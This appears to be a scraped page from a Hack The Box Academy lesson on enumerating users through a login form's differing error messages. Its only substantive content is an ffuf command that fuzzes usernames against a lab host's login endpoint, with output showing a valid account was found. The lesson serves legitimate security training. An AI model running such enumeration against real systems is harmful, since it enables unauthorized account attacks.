<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/80/section/772
// Platform Version: V1
// Module ID: 80
// Module Name: Broken Authentication
// Module Difficulty: Medium
// Section ID: 772
// Section Title: Enumerating Users
// Page Title: Hack The Box - Academy
// Page Number: 3
-->

# Enumerating Users

**Module Name:** Broken Authentication **Page Number:** 3

#### 

#### BROKEN AUTHENTICATION

# Enumerating Users

## User Enumeration Theory

![https://academy.hackthebox.com/storage/modules/269/bf/01-wordpress_wrong_username.png](https://academy.hackthebox.com/storage/modules/269/bf/01-wordpress_wrong_username.png)

![https://academy.hackthebox.com/storage/modules/269/bf/02-wordpress_wrong_password.png](https://academy.hackthebox.com/storage/modules/269/bf/02-wordpress_wrong_password.png)

## Enumerating Users via Differing Error Messages

![https://academy.hackthebox.com/storage/modules/269/bf/userenum_1.png](https://academy.hackthebox.com/storage/modules/269/bf/userenum_1.png)

![https://academy.hackthebox.com/storage/modules/269/bf/userenum_2.png](https://academy.hackthebox.com/storage/modules/269/bf/userenum_2.png)

``` shell-session
ndefstathiou@htb[/htb]$ ffuf -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"

<SNIP>

[Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 310ms]
    * FUZZ: consuelo
```

## User Enumeration via Side-Channel Attacks

# 

# 

#### Questions

####